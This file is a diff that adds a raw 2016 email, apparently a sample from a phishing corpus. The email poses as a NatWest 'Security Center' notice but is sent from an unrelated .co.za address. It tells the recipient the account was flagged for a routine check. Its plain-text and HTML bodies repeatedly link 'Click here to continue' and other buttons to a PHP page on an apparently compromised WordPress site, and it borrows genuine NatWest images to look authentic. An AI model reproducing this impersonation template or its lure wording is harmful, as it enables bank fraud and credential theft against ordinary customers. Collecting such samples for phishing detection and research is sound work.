@@ -1,0 +1,480 @@
+Return-Path: laura@gaclaser.co.za
+Delivered-To: jose@monkey.org
+X-FDA: 71227237200.05.edge54_2e6f7690d0309
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 2,0,0,81f03c77c6139e02,d41d8cd98f00b204,laura@gaclaser.co.za,:laura@gaclaser.co.za,RULES_HIT:1:2:41:72:355:379:455:474:962:967:969:973:978:979:983:988:989:1189:1208:1221:1256:1260:1261:1313:1314:1345:1431:1432:1433:1434:1436:1437:1516:1517:1518:1571:1575:1588:1592:1594:1685:1730:1777:1792:1803:2194:2198:2199:2200:2525:2527:2538:2539:2559:2568:2570:2610:2627:2682:2685:2693:2703:2741:2859:2890:2891:2892:2893:2894:2897:2898:2910:2916:2917:2922:2924:2925:2926:2933:2937:2939:2942:2945:2947:2951:2954:3000:3022:3148:3353:3586:3650:3865:3866:3867:3868:3870:3871:3872:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:4050:4310:4383:4384:4395:4605:4648:5007:6261:7210:7652:7903:8512:8516:8518:8599:8603:8885:8957:8987:9025:9059:9121:9149:9388:9411:9416:9908:9941:10049:10305:10346:11529:11658:12073:12217:12561:12740:12764:13038:13139:13163:13191:13192:13227:13229:13237:13975:14129,0,RBL:197.97.112.45:@gaclaser.co.za:.lbl8.mailshell.net-62.12.255.100 64.201.201.201,CacheIP
+X-HE-Tag: edge54_2e6f7690d0309
+X-Filterd-Recvd-Size: 12040
+Received: from mta15-dc01.cm.synaq.com (mta15-dc01.cm.synaq.com [197.97.112.45])
+	by imf26.b.hostedemail.com (Postfix) with ESMTP
+	for <JOSE@MONKEY.ORG>; Thu, 25 Feb 2016 14:41:58 +0000 (UTC)
+Received: from localhost (localhost [127.0.0.1])
+	by mta15-dc01.cm.synaq.com (Postfix) with ESMTP id 689F31405C0;
+	Thu, 25 Feb 2016 16:41:56 +0200 (SAST)
+Received: from mta15-dc01.cm.synaq.com ([127.0.0.1])
+	by localhost (mta15-dc01.cm.synaq.com [127.0.0.1]) (amavisd-new, port 10032)
+	with ESMTP id S4qJEgNZANFJ; Thu, 25 Feb 2016 16:41:55 +0200 (SAST)
+Received: from localhost (localhost [127.0.0.1])
+	by mta15-dc01.cm.synaq.com (Postfix) with ESMTP id 6283814055D;
+	Thu, 25 Feb 2016 16:41:55 +0200 (SAST)
+X-Virus-Scanned: amavisd-new at mta15-dc01.cm.synaq.com
+Received: from mta15-dc01.cm.synaq.com ([127.0.0.1])
+	by localhost (mta15-dc01.cm.synaq.com [127.0.0.1]) (amavisd-new, port 10026)
+	with ESMTP id EYosliUmjb9f; Thu, 25 Feb 2016 16:41:55 +0200 (SAST)
+Received: from [192.168.1.219] (unknown [197.232.30.102])
+	by mta15-dc01.cm.synaq.com (Postfix) with ESMTPA id 0CB6A14057C;
+	Thu, 25 Feb 2016 16:41:35 +0200 (SAST)
+Content-Type: multipart/alternative; boundary="===============0609948887=="
+MIME-Version: 1.0
+Subject: Important information about your account
+To: Recipients <laura@gaclaser.co.za>
+From: "NatWest" <laura@gaclaser.co.za>
+Date: Thu, 25 Feb 2016 17:41:18 +0300
+Message-Id: <20160225144136.0CB6A14057C@mta15-dc01.cm.synaq.com>
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 85
+
+You will not see this in a MIME-aware mail reader.
+--===============0609948887==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+ =
+
+    =
+
+     =
+
+ 	 =
+
+    =
+
+ 	   	   	     =
+
+  	 =
+
+    =
+
+ 	 =
+
+    =
+
+ 	 =
+
+    =
+
+ =
+
+     =
+
+ 	 =
+
+    =
+
+ 	  =
+
+    =
+
+     =
+
+ 	    NatWest Security  Center 	   =
+
+ 	 =
+
+   	 =
+
+   =
+
+     Dear Customer,
+ =
+
+ Your NatWest online information has been flagged for routine check and thi=
+s requires your attention
+ As part of our new security system, we will be screening activity in the N=
+atWest system. We recently contacted you after noticing an issue on your ac=
+count.
+ We requested information from you for some reason.
+ =
+
+ Click here to continue
+ =
+
+ NatWest Member Services
+ Learn more about  NatWest online System.
+ =
+
+ =
+
+     =
+
+ 	 =
+
+    =
+
+ 	 =
+
+    =
+
+ 	 =
+
+    If this email is inappropriate or in any way violates NatWest online po=
+licy, please help protect other NatWest online community members by  report=
+ing it to us immediately. =
+
+ 	 =
+
+   	 =
+
+    =
+
+ 	 =
+
+   	   =
+
+ 	 =
+
+    =
+
+ 	 =
+
+     =
+
+ =
+
+      =
+
+ 	 =
+
+   =
+
+    =
+
+ 	 =
+
+     NatWest online treats your personal information with the utmost care, =
+and our Privacy Policy is designed to protect you and your information. Nat=
+West online will never ask their users for personal information, such as ba=
+nk account numbers, credit card numbers, pin numbers, passwords, or Social =
+Security numbers in an email. For more information on how to protect your N=
+atWest online password and your account, please visit  User Account Protect=
+ion.
+ 	 =
+
+    =
+
+ 	 =
+
+    This NatWest online notice was sent to you based on your NatWest online=
+ account preferences and in accordance with our  Privacy Policy. To change =
+your notification preferences,  click here. If you would like to receive th=
+is email in text format,  click here.
+ 	 =
+
+    =
+
+ 	 =
+
+     Copyright =A9 2016 NatWest online Inc. All Rights Reserved.
+ Designated trademarks and brands are the property of their respective owne=
+rs.
+ NatWest online and the NatWest online logo are trademarks of NatWest Bank =
+UK. =
+
+ 	 =
+
+   	 =
+
+   	 =
+
+     =
+
+=20
+--===============0609948887==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<html><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></head><div dir=3D"ltr">
+<table dir=3D"ltr" cellpadding=3D"0" cellspacing=3D"0" width=3D"600">
+<tbody>
+<tr>
+<td dir=3D"ltr" style=3D"word-wrap:break-word" width=3D"600">
+<table dir=3D"ltr" border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=
+=3D"600">
+<tbody>
+<tr>
+<td colspan=3D"4" dir=3D"ltr" bgcolor=3D"red" height=3D"2">
+<p dir=3D"ltr">
+<img height=3D"2" width=3D"1"></p>
+</td>
+</tr>
+<tr dir=3D"ltr" valign=3D"top">
+<td dir=3D"ltr" bgcolor=3D"red" height=3D"53" width=3D"170">
+<p dir=3D"ltr">
+<font size=3D"3" face=3D"Arial,
+Helvetica, sans-serif"><img height=3D"1" width=3D"2"></font><img src=3D"htt=
+p://eml.natwest.com/images/807/nw_heroReactivate_01.jpg" alt=3D""></p>
+</td>
+<td dir=3D"ltr" bgcolor=3D"red" height=3D"53" width=3D"121">&nbsp;
+</td>
+<td dir=3D"ltr" bgcolor=3D"red" height=3D"53" width=3D"307">&nbsp;
+</td>
+<td dir=3D"ltr" bgcolor=3D"red" height=3D"53" width=3D"2">
+<div dir=3D"ltr" align=3D"right">
+<p dir=3D"ltr">&nbsp;
+</p>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan=3D"4" dir=3D"ltr" bgcolor=3D"red" height=3D"2">
+<p dir=3D"ltr">
+<img height=3D"2" width=3D"1"></p>
+</td>
+</tr>
+<tr>
+<td colspan=3D"4" dir=3D"ltr" bgcolor=3D"#9999cc" height=3D"2" valign=3D"ce=
+nter">
+<p dir=3D"ltr">
+<img height=3D"2" width=3D"1"></p>
+</td>
+</tr>
+</tbody>
+</table>
+<p dir=3D"ltr">
+<img border=3D"0" height=3D"10" width=3D"1"></p>
+<table dir=3D"ltr" border=3D"0" cellpadding=3D"0" cellspacing=3D"0">
+<tbody>
+<tr>
+<td colspan=3D"3" dir=3D"ltr" bgcolor=3D"red" height=3D"1">
+<p dir=3D"ltr">
+<img height=3D"1" width=3D"1"></p>
+</td>
+</tr>
+<tr>
+<td dir=3D"ltr" bgcolor=3D"red" width=3D"1">
+<p dir=3D"ltr">
+<img height=3D"1" width=3D"1"></p>
+</td>
+<td dir=3D"ltr" valign=3D"top">
+<table dir=3D"ltr" border=3D"0" cellpadding=3D"0" cellspacing=3D"0" height=
+=3D"313">
+<tbody>
+<tr>
+<td dir=3D"ltr" height=3D"20">
+<table dir=3D"ltr" border=3D"0" cellpadding=3D"0" cellspacing=3D"0">
+<tbody>
+<tr>
+<td dir=3D"ltr" bgcolor=3D"#cad2dd">
+<p dir=3D"ltr">
+<img alt=3D" " title=3D"" border=3D"0" height=3D"25" width=3D"25"></p>
+</td>
+<td bgcolor=3D"#cad2dd">
+<b><font color=3D"#000000" size=3D"-1" face=3D"Arial, Helvetica, sans-serif=
+"><a rel=3D"nofollow"> <font color=3D"#000000">
+NatWest
+Security<span lang=3D"ar-sy"> </span> Center</font></a></font></b><font siz=
+e=3D"-1" face=3D"Arial, Helvetica, sans-serif"><b><a rel=3D"nofollow" style=
+=3D"color:rgb(0,0,0);text-decoration:none"> </a></b></font></td>
+<td dir=3D"ltr" bgcolor=3D"#cad2dd">
+<p dir=3D"ltr">
+<img alt=3D" " title=3D"" border=3D"0" height=3D"25" width=3D"25"></p>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td dir=3D"ltr" height=3D"286">
+<table dir=3D"ltr" border=3D"0" cellpadding=3D"10" cellspacing=3D"0">
+<tbody>
+<tr>
+<td dir=3D"ltr">
+<p dir=3D"ltr">
+<font size=3D"-1" face=3D"Arial, Helvetica, sans-serif">Dear Customer,<br>
+<br>
+Your NatWest online information has been flagged for
+routine check and this requires your attention<br>
+As part of our new security system, we will be
+screening activity in the NatWest system. We recently contacted you
+after noticing an issue on your account.<br>
+We requested information from you for some reason.<br>
+<br>
+<a href=3D"http://edbock.u60.honeycomb.com/wp-content/uploads/2010/index.ph=
+p" rel=3D"nofollow"><span>Click here to continue</span></a><br>
+<br>
+<b><font color=3D"#000080">NatWest</font></b> Member
+Services<br>
+Learn more about <a  href=3D"http://edbock.u60.honeycomb.com/wp-content/upl=
+oads/2010/index.php" rel=3D"nofollow"><span>
+NatWest online System</span></a>.<br>
+</font></p>
+<table dir=3D"ltr" border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=
+=3D"100%">
+<tbody>
+<tr>
+<td dir=3D"ltr">
+<p dir=3D"ltr">
+<font size=3D"-1" face=3D"Arial, =
+
+Helvetica, sans-serif"><img height=3D"5" width=3D"1"></font></p>
+</td>
+</tr>
+<tr>
+<td dir=3D"ltr">
+<p dir=3D"ltr">
+<font size=3D"-1" face=3D"Arial, =
+
+Helvetica, sans-serif"><img height=3D"4" width=3D"1"></font></p>
+</td>
+</tr>
+<tr>
+<td dir=3D"ltr">
+<p dir=3D"ltr">
+<font size=3D"-1" face=3D"Arial, =
+
+Helvetica, sans-serif"><img height=3D"5" width=3D"1"></font></p>
+</td>
+</tr>
+</tbody>
+</table>
+<p dir=3D"ltr">
+<font size=3D"-1" face=3D"Arial, Helvetica, sans-serif">If
+this email is inappropriate or in any way violates NatWest online
+policy, please help protect other NatWest online community members by
+<a  href=3D"http://edbock.u60.honeycomb.com/wp-content/uploads/2010/index.p=
+hp" rel=3D"nofollow"> <span>reporting it</span></a> to us immediately. </fo=
+nt></p>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td dir=3D"ltr" bgcolor=3D"#cad2dd" height=3D"7">
+<p dir=3D"ltr">
+<img height=3D"5" width=3D"1"></p>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+<td dir=3D"ltr" bgcolor=3D"red" width=3D"1">
+<p dir=3D"ltr">
+<img height=3D"1" width=3D"1"></p>
+</td>
+</tr>
+<tr>
+<td colspan=3D"3" dir=3D"ltr" bgcolor=3D"red" height=3D"1">
+<p dir=3D"ltr">
+<img height=3D"1" width=3D"1"></p>
+</td>
+</tr>
+</tbody>
+</table>
+<p dir=3D"ltr">&nbsp;
+</p>
+<table dir=3D"ltr" border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=
+=3D"600">
+<tbody>
+<tr>
+<td dir=3D"ltr" valign=3D"top" width=3D"600">
+<p dir=3D"ltr">&nbsp;
+</p>
+</td>
+</tr>
+<tr>
+<td dir=3D"ltr">
+<table dir=3D"ltr" cellpadding=3D"0" cellspacing=3D"0">
+<tbody>
+<tr>
+<td dir=3D"ltr">
+<hr dir=3D"ltr" color=3D"#d2d3d2" noshade=3D"">
+</td>
+</tr>
+<tr>
+<td dir=3D"ltr">
+<p dir=3D"ltr">
+<font face=3D"Arial, Helvetica, sans-serif"><font color=3D"#666666" size=3D=
+"1" face=3D"Arial">
+NatWest online treats your personal information with the
+utmost care, and our Privacy Policy is designed to protect you and your
+information. NatWest online will never ask their users for personal
+information, such as bank account numbers, credit card numbers, pin
+numbers, passwords, or Social Security numbers in an email. For more
+information on how to protect your NatWest online password and your
+account, please visit <a  href=3D"http://edbock.u60.honeycomb.com/wp-conten=
+t/uploads/2010/index.php" rel=3D"nofollow"> <span>User Account Protection</=
+span></a>.</font></font></p>
+</td>
+</tr>
+<tr>
+<td dir=3D"ltr">
+<p dir=3D"ltr">
+<font face=3D"Arial, Helvetica, sans-serif"><img alt=3D" " height=3D"15" wi=
+dth=3D"1"></font></p>
+</td>
+</tr>
+<tr>
+<td dir=3D"ltr">
+<p dir=3D"ltr">
+<font face=3D"Arial, Helvetica, sans-serif"><font color=3D"#666666" size=3D=
+"1" face=3D"Arial">This
+NatWest online notice was sent to you based on your
+NatWest online account preferences and in accordance with our <a rel=3D"nof=
+ollow"> <span>Privacy Policy</span></a>. To change your notification
+preferences, <a  href=3D"http://edbock.u60.honeycomb.com/wp-content/uploads=
+/2010/index.php" rel=3D"nofollow"> <span>click here</span></a>. If you woul=
+d like to
+receive this email in text format, <a rel=3D"nofollow"> click here</a>.</fo=
+nt></font></p>
+</td>
+</tr>
+<tr>
+<td dir=3D"ltr">
+<p dir=3D"ltr">
+<font face=3D"Arial, Helvetica, sans-serif"><img alt=3D" " height=3D"15" wi=
+dth=3D"1"></font></p>
+</td>
+</tr>
+<tr>
+<td dir=3D"ltr">
+<p dir=3D"ltr" align=3D"center">
+<font face=3D"Arial, Helvetica, sans-serif"><font color=3D"#666666" size=3D=
+"1">
+Copyright =A9 2016 NatWest online Inc. All Rights
+Reserved.<br>
+Designated
+trademarks and brands are the property of their respective owners.<br>
+NatWest online
+and the NatWest online logo are trademarks of NatWest Bank
+<span style=3D"border-bottom:2px dotted rgb(54,99,136);background:none repe=
+at scroll 0% 0% transparent">UK</span></font><font color=3D"#666666" size=
+=3D"2">.</font><font color=3D"#666666">
+</font></font></p>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+<p dir=3D"ltr">&nbsp;
+</p>
+</div></html>
+--===============0609948887==--
